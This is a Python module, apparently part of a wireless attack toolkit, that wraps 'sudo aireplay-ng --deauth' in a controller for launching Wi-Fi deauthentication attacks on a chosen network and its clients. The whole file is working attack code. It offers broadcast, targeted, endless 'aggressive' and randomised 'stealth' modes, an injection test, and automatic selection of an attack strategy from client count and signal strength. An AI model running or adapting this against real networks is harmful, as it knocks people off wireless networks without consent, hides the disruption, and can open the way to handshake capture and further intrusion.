"""Deauthentication orchestration helpers."""

from __future__ import annotations

from datetime import datetime
import logging
import random
import re
import subprocess
import threading
import time
from typing import Dict, List, Optional, Tuple

from .models import DeauthConfig, DeauthStrategy

logger = logging.getLogger(__name__)


class DeauthController:
    """Controls deauthentication bursts against a target network."""

    def __init__(self, interface: str):
        self.interface = interface
        self.is_attacking = False
        self.attack_thread: Optional[threading.Thread] = None
        self.stats = {
            "total_packets_sent": 0,
            "total_bursts": 0,
            "clients_deauthed": set(),
            "start_time": None,
            "last_packet_time": None,
        }
        self.packet_timestamps: List[datetime] = []
        self.rate_limit_lock = threading.Lock()

    def deauth_network(
        self,
        bssid: str,
        clients: Optional[List[str]] = None,
        config: Optional[DeauthConfig] = None,
    ) -> bool:
        """Start an asynchronous deauth routine."""

        if self.is_attacking:
            logger.warning("Deauth attack already in progress")
            return False

        self.is_attacking = True
        self.stats["start_time"] = datetime.now()
        attack_config = config or DeauthConfig()
        self.attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(bssid, clients or [], attack_config),
            daemon=True,
        )
        self.attack_thread.start()
        logger.info("Started %s deauth attack on %s", attack_config.strategy.value, bssid)
        return True

    def stop_deauth(self) -> Dict:
        """Stop the active deauth routine and return summary stats."""

        self.is_attacking = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=2)

        started = self.stats.get("start_time")
        if started:
            duration = (datetime.now() - started).total_seconds()
            self.stats["duration"] = duration
            self.stats["packets_per_second"] = self.stats["total_packets_sent"] / duration if duration > 0 else 0

        logger.info("Deauth stopped. Sent %s packets", self.stats["total_packets_sent"])
        return self.stats.copy()

    def _attack_worker(self, bssid: str, clients: List[str], config: DeauthConfig) -> None:
        if config.strategy == DeauthStrategy.BROADCAST:
            self._run_bursts(bssid, [None], config)
        elif config.strategy == DeauthStrategy.TARGETED and clients:
            self._run_bursts(bssid, clients, config, per_target=True)
        elif config.strategy == DeauthStrategy.SEQUENTIAL and clients:
            self._run_bursts(bssid, clients, config)
        elif config.strategy == DeauthStrategy.AGGRESSIVE:
            self._run_aggressive(bssid, clients, config)
        elif config.strategy == DeauthStrategy.STEALTH:
            self._run_stealth(bssid, clients, config)
        self.is_attacking = False

    def _run_bursts(
        self,
        bssid: str,
        clients: List[Optional[str]],
        config: DeauthConfig,
        per_target: bool = False,
    ) -> None:
        for burst_index in range(config.burst_count):
            if not self.is_attacking:
                return
            for client in clients:
                if not self.is_attacking:
                    return
                self._send_deauth_burst(bssid, client, config.packet_count)
                if client:
                    self.stats["clients_deauthed"].add(client)
                if per_target:
                    time.sleep(config.burst_interval)
                elif client is not clients[-1]:
                    time.sleep(1)
            self.stats["total_bursts"] += 1
            if burst_index < config.burst_count - 1 and not per_target:
                time.sleep(config.burst_interval)

    def _run_aggressive(self, bssid: str, clients: List[str], config: DeauthConfig) -> None:
        while self.is_attacking:
            targets = clients if clients and config.skip_broadcast_if_clients else [None]
            for client in targets:
                if not self.is_attacking:
                    return
                self._send_deauth_burst(bssid, client, config.packet_count)
            time.sleep(0.5)

    def _run_stealth(self, bssid: str, clients: List[str], config: DeauthConfig) -> None:
        for _ in range(config.burst_count):
            if not self.is_attacking:
                return
            packet_count = random.randint(1, config.packet_count) if config.vary_packet_count else config.packet_count
            client = random.choice(clients) if clients and random.random() > 0.3 else None
            self._send_deauth_burst(bssid, client, packet_count)
            delay = config.burst_interval
            if config.randomize_timing:
                delay = random.uniform(config.burst_interval * 0.5, config.burst_interval * 1.5)
            time.sleep(delay)

    def _send_deauth_burst(self, bssid: str, client: Optional[str], packet_count: int) -> bool:
        if not self._check_rate_limit():
            logger.warning("Rate limit exceeded, skipping burst")
            return False

        cmd = ["sudo", "aireplay-ng", "--deauth", str(packet_count), "-a", bssid]
        if client:
            cmd.extend(["-c", client])
            logger.debug("Deauth %s from %s (%s packets)", client, bssid, packet_count)
        else:
            logger.debug("Broadcast deauth on %s (%s packets)", bssid, packet_count)
        cmd.append(self.interface)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        except subprocess.TimeoutExpired:
            logger.warning("Deauth command timed out")
            return False
        except Exception as exc:
            logger.error("Failed to send deauth: %s", exc)
            return False

        self.stats["total_packets_sent"] += packet_count
        self.stats["last_packet_time"] = datetime.now()
        self._record_packet_timestamp()
        if "No such BSSID available" in result.stdout:
            logger.warning("BSSID %s not found", bssid)
            return False
        if "write failed" in result.stderr.lower():
            logger.error("Injection failed - interface may not support injection")
            return False
        return True

    def _check_rate_limit(self) -> bool:
        with self.rate_limit_lock:
            now = datetime.now()
            self.packet_timestamps = [stamp for stamp in self.packet_timestamps if (now - stamp).total_seconds() < 1]
            return len(self.packet_timestamps) < 10

    def _record_packet_timestamp(self) -> None:
        with self.rate_limit_lock:
            self.packet_timestamps.append(datetime.now())

    def test_injection(self) -> Tuple[bool, float]:
        """Test injection capability of the current interface."""

        try:
            result = subprocess.run(
                ["sudo", "aireplay-ng", "--test", self.interface],
                capture_output=True,
                text=True,
                timeout=30,
            )
        except Exception as exc:
            logger.error("Injection test error: %s", exc)
            return False, 0.0

        if "Injection is working!" not in result.stdout:
            logger.warning("Injection test failed")
            return False, 0.0

        match = re.search(r"(\d+)%", result.stdout)
        rate = float(match.group(1)) if match else 100.0
        logger.info("Injection test passed: %.1f%% success rate", rate)
        return True, rate

    def calculate_optimal_strategy(self, client_count: int, signal_strength: int) -> DeauthConfig:
        """Return a reasonable default deauth strategy for the target."""

        config = DeauthConfig()
        if client_count > 5:
            config.strategy = DeauthStrategy.BROADCAST
            config.burst_count = 3
            config.packet_count = 15
        elif client_count > 0:
            config.strategy = DeauthStrategy.TARGETED
            config.burst_count = 5
            config.packet_count = 10
        else:
            config.strategy = DeauthStrategy.AGGRESSIVE
            config.burst_count = 10
            config.packet_count = 5

        if signal_strength < -70:
            config.packet_count = min(config.packet_count * 2, 30)
            config.burst_count = min(config.burst_count * 2, 10)
        elif signal_strength > -40:
            config.strategy = DeauthStrategy.STEALTH
            config.randomize_timing = True

        logger.debug("Optimal strategy: %s", config.strategy.value)
        return config

